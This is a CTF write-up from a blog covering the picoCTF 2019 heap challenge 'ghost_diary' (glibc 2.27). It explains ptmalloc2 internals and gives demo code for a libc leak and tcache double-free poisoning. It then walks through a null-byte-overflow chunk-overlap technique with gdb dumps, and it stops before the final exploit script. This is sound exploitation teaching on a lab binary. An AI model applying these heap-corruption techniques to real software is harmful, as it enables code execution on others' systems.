---
layout: post
title:  "picoCTF 2019: Heap Exploitation Challenges (Glibc 2.23, 2.27, 2.29)"
date:   2019-10-12 00:00:00 +0800
categories: pwn
tags: picoCTF-2019
---

I wasn't initially planning on playing picoCTF 2019, as the challenges are generally extremely easy. That was until one of my friends told me about ghost_diary. Of course I'm down if there are some heap exploitation challenges!

Please use the links below to jump straight to whichever challenge you want to have a look at!

<div class="toc-container">
  <ul id="markdown-toc">
    <li><a href="#ghost_diary" id="markdown-toc-h1-header">ghost_diary</a>
    </li>
    <li><a href="#zero_to_hero" id="markdown-toc-h1-header">zero_to_hero</a>
    </li>
    <li><a href="#sice_cream" id="markdown-toc-h1-header">sice_cream</a>
    </li>
  </ul>
</div>

# ghost_diary

Disclaimer: This writeup goes into extreme detail, so if you want to instead have a look at `zero_to_hero` or `sice_cream`, I'd suggest clicking to those from above. Otherwise you'll have a lot of scrolling to do.

This is a glibc-2.27 heap exploitation challenge with a single NULL byte overflow vulnerability. We have to utilize that to create overlapped chunks in order to be able to get a libc leak as well as perform a double free. The double free will let us to overwrite `__free_hook` to `system` and get a shell.

### **Challenge**

* **Category:** pwn
* **Points:** 500
* **Solves:** 63

>Try writing in this [ghost diary](https://2019shell1.picoctf.com/static/2136859eaddb15400ec3328f017e1df8/ghostdiary). Its also found in /problems/ghost-diary_4_f7e6ee76ec07e6866ddc813917b94545 on the shell server.

### **Solution**

Before you read this writeup, I would highly suggest having some prior knowledge about how the heap works on linux. Linux uses an allocator called `ptmalloc2`, and here are some great resources to get you started:

* [ctf-wiki: Extremely detailed information (in Chinese). This one is my favorite, use google translate](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/introduction-zh/)
* [sploitfun: Overview of ptmalloc2](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)
* [dhavalkapil: Overview + some exploits](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/malloc_chunk.html)
* [how2heap: Exploits from shellphish](https://github.com/shellphish/how2heap)
* [InfoSectBR: Some more writeups for some heap exploitation attacks](http://blog.infosectcbr.com.au/)

I will provide a brief overview of the heap further down, but I will still skip a lot of information and assume that the reader will be using these references to fully understand everything I say.

#### **Reversing the binary**

Let's start off by reverse engineering the binary. I first set up an Ubuntu Bionic VM, as that is the environment that the challenge server runs on.

Running `checksec` and `file` on it shows us the following:
```sh
vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary$ file ghostdiary
ghostdiary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=da28ccb1f0dd0767b00267e07886470347987ce2, stripped

vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary$ checksec ghostdiary
[*] '/ctf/pwn-and-rev/picoctf-2019/ghost_diary/ghostdiary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So, we have a stripped, dynamically linked 64-bit binary here with all protections enabled. An explanation for each protection is given below:

* **Full RELRO**: The Global Offset Table (GOT) is read-only, meaning we won't be able to overwrite a function pointer there and hijack flow of execution easily.
* **Canary found**: There is a stack canary, so stack buffer overflows are out of the question unless we can somehow leak the canary.
* **NX enabled**: There is no memory region that is both writable and executable, meaning we can't inject shellcode into the program and have it execute the shellcode.
* **PIE enabled**: PIE stands for Position Independent Executable. It means that the base address of the binary is randomized each time we run it, meaning we can't use exploits such as ROP or ret2libc since we don't know any addresses at all without a leak.

So off the get go we can already see that this won't be an easy challenge. Fortunately for us, heap exploits don't care about any of these protections (most of the time at least).

The binary itself is very simple. You should be able to reverse engineer it yourself pretty easily. Note that any code shown below is my interpretation of the assembly code that I've gotten after disassembling the binary.

There is a global array of "pages" that can store 19 pages. Each page is a struct that contains a pointer to the page's content on the heap, as well as the size of the content. The struct looks something like the following:
```c
struct page
{
	char* content; // The actual content of the page
	int size; // The size of the content
};

struct page array_of_pages[19]; // Maximum of 19 pages allowed
```

We also have the following functionality:

* `sub_B5D` is the "New page in diary" function. You are allowed to add either a one-sided page or a two-sided page. If you choose a one-sided page, you can allocate a chunk <= 0xf0 in size. If you choose a two-sided page, you can allocate a chunk in between 0x110 and 0x1e0 (inclusive). There is a limit of 19 pages imposed.
* `sub_CFB` is the "Talk with ghost" function. It lets you edit a page and put your own content into it. This function calls `sub_DA2` to read in user input for the content. `sub_DA2` has a single null byte overflow vulnerability in it.
* `sub_DBE` is the "Listen to ghost" function. It outputs the contents of a page.
* `sub_E69` is the "Burn the page" function. It frees a page and nulls out the pointer in the global array of pages, hence no use-after-free.

The only vulnerability we have is a single null byte overflow in `sub_DA2`. The "Talk with ghost" (`sub_CFB`) function does something like the following:
```c
void talkWithGhost()
{
	int page_index;

	printf("Page: ");
	scanf("%d", &page_index);

	printf("Content: ");

	if (page_index <= 19 && global_pages_array[page_index] != NULL)
	{
		// Call sub_DA2 to read in the user's input
		sub_DA2(global_pages_array[page_index].content, global_pages_array[page_index].size);
	}
}
```

`sub_DA2` does something like the following:
```c
void sub_DA2(char *chunk_ptr, int size)
{
	int num_of_bytes_read = 0, index_to_write_to = 0;
	char buf;

	if (size) // Ensure size isn't just 0
	{
		while (num_of_bytes_read != size) // Read until size is hit, no heap overflow here
		{
			if (read(0, &buf, 1) != 1) // Read a single byte each time
			{
				puts("read error");
				exit(-1);
			}

			if (buf == '\n') // Quit if the byte read in is a newline
				break;

			// Write to the current index and increment the num_of_bytes_read
			index_to_write_to = num_of_bytes_read++;
			chunk_ptr[index_to_write_to] = buf;
		}
		chunk_ptr[num_of_bytes_read] = 0; // Null byte overflow here when setting the final byte to '\0'
	}
}
```

The vulnerability is obvious now. If we read the maximum amount of bytes possible, then we will have a single null byte overflow that will overflow into (possibly) the metadata of the next chunk. How do we use this to our advantage?

You may immediately have an *idea* as to how this vulnerability could be used exploited, but it definitely requires a very in-depth knowledge of the heap to know exactly how to exploit it. I'll take a quick detour now and provide a brief overview of ptmalloc2, the heap in glibc, and its internals now. Experienced readers can skip this part and go straight to the "Exploitation" section.

I will also skip explaining any information that isn't required for this challenge, such as the concept of arenas amongst other things.

It will be assumed that the reader has prior knowledge of how stack buffer overflows work. I will use the following link for reference:

* [Understanding the glibc malloc](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)

### **Overview of the glibc heap**

#### What is the heap?

The heap is, simply put, a memory region allotted to every program. This memory region can be dynamically allocated, meaning that a program can **request** and **release** memory from the heap whenever it requires. The heap is also a global memory space, meaning it isn't localized to a function like the stack is. This is mainly accomplished through the use of pointers to reference heap allocations.


#### How does a program request and release memory from the heap?

* **malloc**

>A program may use `malloc(size_t n)` (and all its different versions such as `calloc` and `realloc`) to request a chunk of at least `n` bytes, or `NULL` if no space is available. If `n` is zero, malloc returns a minimum-sized chunk (0x10 bytes on most 32-bit systems, and either 0x18 or 0x20 bytes on 64-bit systems). In most systems, `size_t` is an unsigned type, so negative values of `n` will be interpreted as a request for a huge amount of space, which will often fail.

* **free**

>A program may use `free(void *p)` to release the chunk of memory pointed to by `p`. This has no effect if `p` is `NULL`. It can have very bad effects if `p` has already been freed, or if `p` is not a malloc'd chunk at all.

#### What does a chunk look like in memory?

A chunk in memory can either be free, or in-use. Chunks are stored in so-called "arenas". Each thread gets its own "arena" of chunks, and there is a special arena called the "main arena" which is the very first arena created by a program. This is also the only arena present in single-threaded programs.

A structure called the `malloc_chunk` (a pointer to which is typedef'd as `mchunkptr`) is used by glibc to keep track of chunks, as follows:
```c
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */

  /* double links -- used only if free. */
  struct malloc_chunk* fd;
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  /* double links -- used only if free. */
  struct malloc_chunk* fd_nextsize;
  struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;
```

**Allocated Chunk Visual Structure**:
```
chunk-----> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
mem-------> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Free Chunk Visual Structure**:
```
chunk-----> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|0|P|
mem-------> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list (fd)        |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list (bk)       |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .                                                               .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of current chunk, in bytes                   |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|0|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

Free chunks will (depending on their size and glibc version) either maintain themselves in a circular doubly linked list, or a single linked list. As you can see above, the size of a chunk has three bits at the end labeled `A`, `M`, and `P`. These are important:

* **A (NON_MAIN_ARENA)**: 0 for chunks in the main arena. Each thread spawned in a program receives its own arena, and for any chunks malloc'd in each of those threads, this bit is set to 1. The main arena is the arena that is always there prior to any new threads having been spawned in.

* **M (IS_MMAPPED)**: The chunk has been obtained through `mmap`. The other two bits are correspondingly ignored if this bit is set to 1, because `mmapped` chunks are neither in an arena, nor adjacent to any other free chunks.

* **P (PREV_INUSE)**: Set to 0 when the previous chunk (not the chunk before it in its free-list, but the one before it in memory) is free. The size of that previous free chunk is stored before the size of this current chunk ***only if*** the previous chunk is free, otherwise the previous chunk can use that `prev_size` space as if it was its own. The very first allocated chunk will always have this bit set. If this bit is set to 1, we cannot determine the previous chunk's size.

The most important thing to note here is that freed chunks remain on the heap. They aren't magically moved out of the heap into some other memory region. They make use of the forward and back pointers to track themselves in the free-lists (called `bins`) This means that given a vulnerability such as a heap overflow or a use-after-free (UAF), we can overwrite those forward and back pointers and thus corrupt the free lists. This can be used to our advantage, and if done carefully, can lead to code execution.

The other thing to note is that with something like a double free vulnerability, a freed chunk's forward pointer would point to itself. We can also utilize this to our advantage, and we will do so in the exploit for this challenge.

#### Bins and Chunks

A `bin` is glibc's term for a free-list. It is a singly or doubly linked list of free chunks. Whether it is singly linked or doubly linked depends on the size of the chunks being stored. Bins are differentiated based on the size of chunks that they contain. We have the following 5 bins in glibc 2.27:

1. **Tcache bin** (added with glibc 2.26) for any chunks <= 0x408 bytes in size. It is singly linked. Each tcache bin stores chunks of the same size. Each tcache bin has a max limit of 7 chunks that it can store.
2. **Fast bin** (not covered in this post, assumed knowledge) for any chunks <= 0x60 bytes in size. There are 10 fast bins, each singly linked.
3. **Unsorted bin**. Small and large chunks end up in this bin initially when freed. It essentially acts as a cache layer to speed up allocation and deallocation requests. There is only 1 unsorted bin and it is doubly linked.
4. **Small bin** (not covered in this post, assumed knowledge) for any chunks <= 0x200 bytes in size. Yes, the small bins overlap with the fast bins due to the fact that the fast bins have an upper limit to how many chunks they can store. Small bins are doubly linked.
5. **Large bin** (not covered in this post, assumed knowledge) for any chunks larger than the upper small chunk limit of 0x200 bytes. Large bins are doubly linked.

For information regarding the three bins that are not covered, see [this](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks.html).

There is also a special chunk called the "top chunk". This is the chunk that borders the top of an arena. While servicing any allocation requests, it us used as the last resort (i.e space is taken out of the top chunk to service the allocation request). It can also grow using the `sbrk` system call. The `PREV_INUSE` bit is always set for the top chunk.

When chunks are allocated, there is usually an extra 0x08 or 0x10 bytes added to the size to store the metadata for the chunk. The metadata includes the `prev_size` and `size` fields of the chunk.

When a chunk is freed, if the chunk ends up in a bin that is ***not*** a fast bin nor a tcache bin, then the chunk that comes after it in memory will have its `PREV_INUSE` bit set to 0. If it does end up in a tcache bin or a fast bin, the next chunk's `PREV_INUSE` bit does not get set to 0.

#### Introduction to Tcache

I will be referring to the source code of `malloc.c` from glibc 2.27, found [here](https://ftp.gnu.org/gnu/glibc/glibc-2.27.tar.bz2).

Two new data structures were added in glibc 2.26 as shown below:
```c
/* Used to maintain a single free chunk in a tcache bin */
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;

/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS]; // TCACHE_MAX_BINS = 64
} tcache_perthread_struct;

static __thread char tcache_shutting_down = 0;

/* Used to maintain all free chunks that belong to this current thread's tcache bin.
 * This is stored at the very start of the heap, as soon as the first chunk gets malloc'd in a program
 */
static __thread tcache_perthread_struct *tcache = NULL;
```

To support allocation and deallocation for tcache chunks, two new functions were also added in glibc 2.26:
```c
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */
static void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```

* `tcache_get` is similar to `__int_malloc`, which returns an available chunk to the application. This chunk will come out of the tcache bin.

* `tcache_put` is similar to `__int_free`, which puts the chunk currently being freed into the tcache bin.

* The tcache bin is a singly linked list of free chunks. It follows a LIFO structure. There are tcache bins created for each chunk size (0x20, 0x30, 0x40, ...), and each tcache bin has a maximum of 7 chunks that it can store.

* As is also evident from the comments above the two functions above, there are zero security checks performed when freeing or mallocing out of a tcache bin. This, coupled with the fact that a tcache bin of a specific size has a max limit of 7 chunks, is very important to us. Every other bin has security checks to ensure the integrity of itself as well as the chunks it stores, but the tcache does not.

* Each thread has 64 tcache bins, each holding chunks of the same size. The maximum size chunk that the final tcache bin will hold (on 64-bit systems) is 0x408 bytes.

* If there is a chunk in a tcache bin and a request is made for a chunk of the same size, then the tcache bin takes priority over all other bins (i.e if there is a chunk of the same size in any of the other bins, they are ignored as the tcache bin is given priority). All bins in general take priority over the top chunk.

* If a chunk is freed and inserted into a tcache bin, the chunk immediately after this freed chunk (in memory) does ***not*** have its `PREV_INUSE` bit set to 0.

* If two adjacent chunks are freed and put into a tcache bin, these chunks do not consolidate together (i.e `malloc_consolidate` is never called for tcache chunks).

#### The Unsorted Bin

The unsorted bin is an optimizing cache layer that got added based on two simple observations. Those being that frees are often clustered together, and that frees are often immediately followed by allocations of similarly sized chunks. In these cases, merges of these freed chunks before putting the resulting larger chunk away in the correct bin would avoid some overhead, and being able to fast-return a recently freed allocation would similarly speed up the whole process.

Whenever a small or a large chunk is freed, they will initially be inserted into the unsorted bin. In glibc versions 2.26+, the only constraint is that if a small chunk is freed, the corresponding sized tcache bin must be full, otherwise the chunk will just end up in that tcache bin.

The reason the unsorted bin is important to us is because as soon as a chunk goes into the unsorted bin, a pointer to the unsorted bin (which exists within libc) is inserted into the forward and back pointers of that free chunk.

We can easily cause this by first filling up a tcache bin of a small size (i.e <= 0x200 bytes in size) with 7 chunks, then freeing a chunk of that same size one more time. This 8th and final free will cause the chunk to go into the unsorted bin due to the tcache bin being full. If you then have a UAF vulnerability, you can read this libc pointer and get an info leak, which lets you defeat both PIE and ASLR. An example is given below.

If you want to demo the code below, you must use either glibc version 2.26 or 2.27:
```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	unsigned long *chunks[8];

	// Allocate 8 chunks of size 0x80
	for (int i = 0; i < 8; i++)
	{
		chunks[i] = malloc(0x80);
	}

	// Allocate one more chunk to prevent the unsorted bin chunk from being consolidated
	// with the top chunk after it's freed
	malloc(0x80);

	// Free 7 of them to fill up the 0x80 sized tcache bin
	for (int i = 0; i < 7; i++)
	{
		free(chunks[i]);
	}

	// The next free will go into the unsorted bin as the tcache bin is full
	free(chunks[7]);

	// Print out the forward pointer of the last freed chunk by emulating a UAF vulnerability
	// This will point into libc
	printf("0x%lx\n", *chunks[7]);
}
```
```sh
vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary$ gcc unsortedbin.c
vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary$ ./a.out
0x7f333f8f6ca0
```

This is very important. If we can somehow read this pointer (using a use-after-free, or overlapped chunks, by any means), then we have an information leak that we can use to find the base address of libc. This defeats both PIE and ASLR in one shot. This characteristic of the unsorted bin is used in the exploit for this challenge.

#### The Tcache Poisoning Attack

Given a double free vulnerability, we can get `malloc` to return an arbitrary pointer which lets us have an arbitrary read/write primitive. It abuses the fact that a double free will cause two of the same chunk to be inserted into the tcache bin, meaning that this chunk will have its `fd` pointer pointing to itself.

This is shown below, as well as utilized in our exploit. Credits to shellphish's [how2heap](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c) for part of the code:
```c
#include <stdio.h>
#include <stdlib.h>

int *arbitrary_pointer = NULL;

int main()
{
    int *our_pointer = NULL;

    fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n\n");
    fprintf(stderr, "We want a chunk on top of the global variable arbitrary_pointer at %p\n\n", &arbitrary_pointer);

    fprintf(stderr, "Allocating buffer.\n");
    int *a = malloc(8);

    fprintf(stderr, "malloc(8): %p\n", a);
    fprintf(stderr, "Freeing twice...\n");
    free(a);
    free(a);

    fprintf(stderr, "Now the free list has [ %p, %p ].\n\n", a, a);

    fprintf(stderr, "Next we allocate one of the chunks\n\n");
    a = malloc(8);

    fprintf(stderr, "Now the free list has [ %p ].\n", a);
    fprintf(stderr, "Now we overwrite a's fd pointer to the address of arbitrary_pointer\n");
    a[0] = (unsigned long long) &arbitrary_pointer;

    fprintf(stderr, "And now, the free list has [ %p %p ].\n\n", a, &arbitrary_pointer);
    fprintf(stderr, "Two more mallocs, and the second malloc gives us a chunk right on top of arbitrary_pointer\n\n");

    malloc(8);
    our_pointer = malloc(8);

    fprintf(stderr, "arbitrary_pointer: %p, our_pointer: %p\n", &arbitrary_pointer, our_pointer);

    return 0;
}

```
```
vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary$ gcc a.c
vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary$ ./a.out
This file demonstrates a simple double-free attack with tcache.

We want a chunk on top of the global variable arbitrary_pointer at 0x555e1efe1030

Allocating buffer.
malloc(8): 0x555e20bac260
Freeing twice...
Now the free list has [ 0x555e20bac260, 0x555e20bac260 ].

Next we allocate one of the chunks

Now the free list has [ 0x555e20bac260 ].
Now we overwrite a's fd pointer to the address of arbitrary_pointer
And now, the free list has [ 0x555e20bac260 0x555e1efe1030 ].

Two more mallocs, and the second malloc gives us a chunk right on top of arbitrary_pointer

arbitrary_pointer: 0x555e1efe1030, our_pointer: 0x555e1efe1030
```

#### **Exploitation**

Now, hopefully I've explained everything clearly enough for everyone to be able to follow through with the writeup. If I haven't, please do consider spending a little bit more time skim-reading through the links I've provided above. I will try to explain the exploitation steps as clearly and as concisely as possible.

The challenge itself took me about 3.5 hours to figure out. The exploitation steps I used are laid out below. Please follow my exploit script (shown at the end) alongside each step to help visualise the heap at each step:

#### Step 1: **The setup**

* Set up three chunks that we will use for our exploit. These chunks will be A, B, and C respectively. A's size will be 0x128 (0x131 in memory due to metadata, `PREV_INUSE` bit set to 1), while B and C's sizes will be 0x118 (0x121 in memory due to metadata, `PREV_INUSE` bits set to 1).

* The idea is that we want to use the single NULL byte overflow to set C's `PREV_INUSE` bit to 0, meaning we change C's size from 0x131 to 0x100. As we do that, we also want to set C's `prev_size` field to 0x250. More information about that is given below.

* The chunks are shown in gdb as follows:

```c
gef➤  x/200gx 0x000055a7bc254000
...
0x55a7bc254250: 0x0000000000000000      0x0000000000000131 <- chunk A
0x55a7bc254260: 0x0000000000000000      0x0000000000000000
...
0x55a7bc254380: 0x0000000000000000      0x0000000000000121 <- chunk B
0x55a7bc254390: 0x0000000000000000      0x0000000000000000
...
0x55a7bc2544a0: 0x0000000000000000      0x0000000000000121 <- chunk C
```

#### Step 2: **Prepare the tcache bins**

* Completely fill up the 0xf0 sized tcache bin (Which would store the freed chunk C ***after*** its size is overwritten to 0x100) and 0x128 sized tcache bin (which would otherwise store chunk A when we free it).

```c
gef➤  heap bins tcache

// Counts set to 7 meaning both tcache bins are full
Tcachebins[idx=14, size=0xf0] count=7  ←  Chunk(addr=0x55a7bc254bd0, size=0x100, flags=PREV_INUSE)  ←  Chunk(addr=0x55a7bc254ad0, size=0x100, flags=PREV_INUSE)  ←  ...

Tcachebins[idx=17, size=0x120] count=7  ←  Chunk(addr=0x55a7bc2553f0, size=0x130, flags=PREV_INUSE)  ←  Chunk(addr=0x55a7bc2552c0, size=0x130, flags=PREV_INUSE)  ←  ...
```

* We don't want either of the chunks A or C to go into the tcache bins, as there is no consolidation in the tcache bins. The exploit relies on the fact that chunk C will coalesce backwards with chunks A and B provided we set up the heap correctly.

#### Step 3: **Prepare chunk A for consolidation later on**

* Free chunk A. This sends chunk A into the unsorted bin (as the 0x128 sized tcache bin is full), meaning a libc pointer pointing to the `main_arena` is placed into chunk A's `fd` and `bk` pointers, as shown below:

```c
gef➤  x/40gx 0x000055a7bc254250                          
0x55a7bc254250: 0x0000000000000000      0x0000000000000131 <- chunk A
0x55a7bc254260: 0x00007f7e28fbeca0      0x00007f7e28fbeca0 <- libc pointers into the main_arena unsorted bin
0x55a7bc254270: 0x0000000000000000      0x0000000000000000
...
```

* We do this free here in order to get some valid pointers inserted into A's `fd` and `bk` fields. This is important later because when we free chunk C and have it consolidate backwards with chunks A and B, there are some security checks that will ensure that chunk A's `fd` and `bk` pointers are valid. More information will be given below when chunk C is being freed.

* Using gdb, we can calculate the difference between the leaked pointers and the libc base now. This offset remains constant every time we run the program. This offset is found to be `0x3ebca0`.

#### Step 4: **Abuse the vulnerability**

* Edit chunk B's contents to cause a NULL byte overflow into chunk C's size. This changes chunk C's total size (including metadata) from 0x121 to 0x100. Notice that the `PREV_INUSE` bit gets set to 0 in the process, due to the NULL byte overflow, which causes the chunk that is `prev_size` bytes before C to appear to be free when we free chunk C later on.

* In the process of doing the NULL byte overflow, we also set chunk C's `prev_size` field to 0x250. This causes the `prev_size` field to encompass both chunks A and B. Later when we free chunk C, the `unlink` macro is called using chunk A ***because*** of the fact that we set chunk C's `prev_size` such that it encompasses up to chunk A. This causes chunks A, B, and C to be consolidated into one large chunk, which is then put into the unsorted bin.

* The code for the unlink macro will be shown a bit further down.

```c
gef➤  x/80gx 0x55a7bc254380
0x55a7bc254380: 0x0000000000000130      0x0000000000000120 <- chunk B
0x55a7bc254390: 0x4242424242424242      0x4242424242424242
...
0x55a7bc254480: 0x4242424242424242      0x4242424242424242
0x55a7bc254490: 0x4242424242424242      0x4242424242424242
0x55a7bc2544a0: 0x0000000000000250      0x0000000000000100 <- prev_size 0x250 followed by chunk C size overwritten
0x55a7bc2544b0: 0x0000000000000000      0x0000000000000000
0x55a7bc2544c0: 0x0000000000000000      0x0000000000000000
```

* The most important aspect of this is that we ***still*** have a pointer to chunk B.

#### Step 5: **Setup chunk C for the unsorted bin**

* Since chunk C's size has changed from 0x121 to 0x100, we must create a fake chunk within chunk C. We need to do this now because freeing chunk C will insert it into the unsorted bin as the 0xf0 tcache bin is full (remember that the 0x100 size includes metadata, so the chunk really has a size of 0xf0 without the metadata).

```c
gef➤  x/50gx 0x55a7bc2544a0
0x55a7bc2544a0: 0x0000000000000250      0x0000000000000100 <- chunk C
0x55a7bc2544b0: 0x4343434343434343      0x4343434343434343
...
0x55a7bc254590: 0x4343434343434343      0x4343434343434343
0x55a7bc2545a0: 0x4343434343434343      0x0000000000000021 <- fake chunk inserted to bypass security checks
0x55a7bc2545b0: 0x0000000000000000      0x0000000000000000
0x55a7bc2545c0: 0x0000000000000000      0x0000000000000101 <- actual next chunk after C
0x55a7bc2545d0: 0x0000000000000000      0x0000000000000000
```

* When the chunk is put into the unsorted bin, there are some security checks that we must bypass, and this fake chunk helps with that. More details below.

#### Step 6: **Free chunk C, causing the backwards consolidation**

* Now, after all this preparation, we free chunk C. This calls `_int_free()`. First, the tcache bin 0xf0 is checked to see if there is space in it, but it's already full, so chunk C is then placed into the unsorted bin.

* While this is done, chunk C's size is checked, and it is seen to be 0x100. `_int_free()` will then check for a chunk 0x100 bytes after chunk C to ensure that that chunk's `PREV_INUSE` bit is set to 1. If it is not, then `_int_free()` will error out saying `"double free or corruption (!prev)"`, since chunk C will appear to be free if the next chunk's `PREV_INUSE` bit is not set to 1.  

* Since we changed chunk C's size from 0x121 to 0x100, there isn't a chunk 0x100 bytes after chunk C, which is why we place a chunk there ourselves with its `PREV_INUSE` bit set to 1. This check is documented [here](https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4279):

```c
/* Or whether the block is actually not marked used.  */
if (__glibc_unlikely (!prev_inuse(nextchunk)))
	malloc_printerr ("double free or corruption (!prev)");
```

* Next, the `PREV_INUSE` bit of chunk C is checked. Since it has been set to 0 by us, the chunk is consolidated backwards using the `prev_size` field value. This consolidation backwards will call the `unlink` macro, which has a bunch of security checks. The consolidation is shown [here](https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4290):

```c
/* consolidate backward */
if (!prev_inuse(p)) {
	prevsize = prev_size (p);
	size += prevsize;
	p = chunk_at_offset(p, -((long) prevsize));
	unlink(av, p, bck, fwd);
}
```

* Now, remember when we freed chunk A initially? I said the reason behind it was so that chunk A's `fd` and `bk` fields get filled with valid pointers. From the code snippet above, you can see that when `_int_free()` attempts to perform backwards consolidating, it will call the `unlink` macro with chunk A as its second parameter. Within the unlink macro (the code for which can be found [here](https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L1403)), we can see following code along with its extensive security checks:

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
    FD = P->fd;								      \
    BK = P->bk;								      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr ("corrupted double-linked list");			      \
    else {								      \
        FD->bk = BK;							      \
        BK->fd = FD;							      \
        if (!in_smallbin_range (chunksize_nomask (P))			      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      \
	    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      \
		|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
	      malloc_printerr ("corrupted double-linked list (not small)");   \
            if (FD->fd_nextsize == NULL) {				      \
                if (P->fd_nextsize == P)				      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;		      \
                else {							      \
                    FD->fd_nextsize = P->fd_nextsize;			      \
                    FD->bk_nextsize = P->bk_nextsize;			      \
                    P->fd_nextsize->bk_nextsize = FD;			      \
                    P->bk_nextsize->fd_nextsize = FD;			      \
                  }							      \
              } else {							      \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
              }								      \
          }								      \
      }									      \
}
```

* It is evident that the line `if (__builtin_expect (FD->bk != P || BK->fd != P, 0))` will use the two pointers from chunk A's `fd` and `bk` fields to perform some security checks. If we didn't free chunk A initially, those pointers would be `NULL`, and this check here would attempt to dereference these `NULL` pointers, and thus seg fault immediately. Freeing chunk A initially prevents that as well as lets us get past these security checks.

